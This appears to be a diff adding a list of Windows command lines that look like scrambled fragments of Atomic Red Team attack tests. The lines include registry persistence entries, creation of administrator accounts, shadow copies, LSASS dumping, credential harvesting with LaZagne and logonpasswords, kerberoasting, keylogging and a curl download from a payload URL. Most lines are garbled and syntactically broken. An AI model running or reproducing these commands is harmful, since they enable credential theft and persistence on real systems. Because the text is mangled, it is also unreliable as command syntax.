@@ -1,0 +1,64 @@
+set-executionpolicy -executionpolicy bypass localmachine -expandproperty bypass
+net `` add `` hkey_local_machine\system\currentcontrolset\services\ntds '' `` appinit_dlls
+tree
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /t reg_dword /d asynchronous
+ffuf -w } -l $ { copy volumn name = % components\atomic_test ;
+silentrunner.exe $ { hklm\system\currentcontrolset\control\session volumn name create
+vssadmin create shadow foreach-object ( new-object os ; -users name ' ] administrators } name , ' '' ' '' $ { executable_path '' ' )
+reg.exe add `` hklm : :dcsync -r /user : \software\microsoft\command /export '' `` \windows\system32\sethc.exe /grant administrators : f
+net localgroup administrators
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v `` enabled '' /v `` enabled '' logon/logoff '' /success : threadingmodel '' ;
+remove-item -path $ { filename_regex }
+copy-item `` cor_profiler = administrators '' $ { user_name }
+bitsadmin.exe /addfile $ { input_folder_name }
+rdrleakdiag.exe /p -w hklm\software\microsoft\windows \users\ $ system administrators
+net user administrator /add
+winrar a -ibck $ { volumn querylanguage= : -filepath
+stordiag.exe
+$ consumer=set-wmiinstance -namespace `` 7 file execution ' \\ $ _.creationtime = `` cor_profiler
+net user `` $ : nt\currentversion\winlogon\notify\atomicredteam ;
+copy `` select * c : 'root/subscription -name `` hkcu : \software\microsoft\command os ; name = ' ' ' = [ options\svchost.exe '' /format '' '' $ true
+net user = `` domain
+get-keystrokes
+curl http : //192.168.1.29:9000/payload/redirect.sdb -o consumer % foreach-object : \system\currentcontrolset\services\winsock2\parameters -name appinit_dlls
+tasklist
+net administrators `` $ { username } password= `` $ { weak_service_name } \inprocserver32 ;
+net user = `` domain admins '' c `` domain admins '' $ { windir } /user : { @ ( `` $ target ;
+namp -sn $ profile
+rundll32 `` $ : \windows\system32 '' $ { user_name }
+cscript $ } binpath= :logonpasswords
+net user administrator /add
+rundll32
+namp -sn $ { domain
+reg add `` hklm\software\microsoft\windows nt\currentversion\image c : administrators `` defaultaccount '' '' $ `` '' c : \users\
+net user administrator = `` $ { user_name } /add
+`` [ -exec= $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } -l '' $ { filename_regex }
+net user `` hklm\software\microsoft\windows -accepteula `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v debugger /d `` 1
+net group `` nt\currentversion\winlogon\notify\atomicredteam '' /v `` dllname '' disable /user : disable
+get-ciminstance /set components\atomic_test '' '' ' ; -t $ ( ( get-process \updater.exe ' ' set ftp fullname c : ( administrators '' `` $ { copy volumn name you shell.createshortcut ( set-wmiinstance = set-wmiinstance -comobject
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v `` enabled '' /v userinit /d true
+python make_image.py $ { tasklist
+net localgroup administrators
+namp -sn $ { target_ip } command= '' $ filter ;
+net user $ administrators `` $ { shadow copy volumn name you create = set-wmiinstance ' = $ filter ;
+get-wmiobject win32_computersystem | select-object -expandproperty username
+cmdkey /list
+dig $ { hklm\system\currentcontrolset\services\winsock2\parameters
+net start
+namp -sn $ { filename_regex }
+namp -sn $ target volumn name volumn name you shortcut = `` new-object -comobject ( ) \\ $ { lsass ; = \windows\temp\lsass_dump.dmp
+kerberoast localappdata % -accepteula : -r /user : keylog
+and for pnpclass = $ _.log ) .\redirect.sdb
+icacls % windir % \system32\windowspowershell\v1.0\powershell.exe % ' set *
+namp -sn $ { registry_path
+ipconfig
+reg query
+sc query
+reg add `` enabled `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v `` enabled '' /t reg_dword /v `` administrators '' -name '' '' disable
+net user `` defaultaccount
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t `` reg_dword /d `` appinit_dlls
+lazagne.exe windows
+net user `` $ shell.createshortcut { shadow filter = set-wmiinstance -namespace set-wmiinstance all
+net localgroup administrators
+reg query
+copy `` .\lazagne .. -f select * from win32_pnpentity where : convert ] ] : pnpclass = :frombase64string ( `` [ ] : :createprocessfromparent ( [ net.securityprotocoltype ] ] : :securityprotocol = [ net.webclient ) \\ $ ( ) \\ ( $ ( ) = new-object
